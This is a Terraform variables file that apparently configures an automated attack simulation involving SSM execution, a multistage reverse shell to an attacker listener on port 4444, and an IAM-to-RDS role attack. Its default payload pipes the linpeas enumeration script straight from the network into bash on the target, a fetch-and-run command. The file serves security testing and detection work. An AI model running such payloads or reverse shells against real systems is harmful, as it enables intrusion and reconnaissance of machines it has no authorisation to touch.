variable "environment" {
  type = string
  description = "name of the environment"
}

variable "deployment" {
  type = string
  description = "unique deployment id"
}

variable "region" {
  type = string
  description = "region for deployed resources"
}

variable "tag" {
  type = string
  default = "ssm_exec_reverse_shell_multistage_attacker"
}

variable "scenario" {
  type = string
  default = "default"
}

variable "timeout" {
  type = number
  default = 5400
}

variable "cron" {
  type = string
  default = "cron(0 */2 * * ? *)"
}

variable "listen_ip" {
  type = string
  description = "IP address of attacker"
  default = "0.0.0.0"
}

variable "listen_port" {
  type = number
  description = "Port address of attacker"
  default = 4444
}

variable "payload" {
  type = string
  description = "The bash commands payload to execute when target machine connects"
  default = <<-EOT
            curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files
            EOT
}

variable "attack_delay" {
  type = number
  description = "wait time between baseline and attack (default: 12 hours)"
  default =  50400
}

variable "iam2rds_role_name" {
  type = string
  description = "The default role name to use for the iam2rds attack"
  default = "rds_user_access_role_ciemdemo"
}

variable "iam2rds_session_name" {
  type = string
  description = "The default role name to use for the iam2rds attack"
  default = "attacker-session"
}

variable "reverse_shell_host" {
  type = string
  description = "the hostname or ip for the reverse shell server - used in multistage"
  default = null
}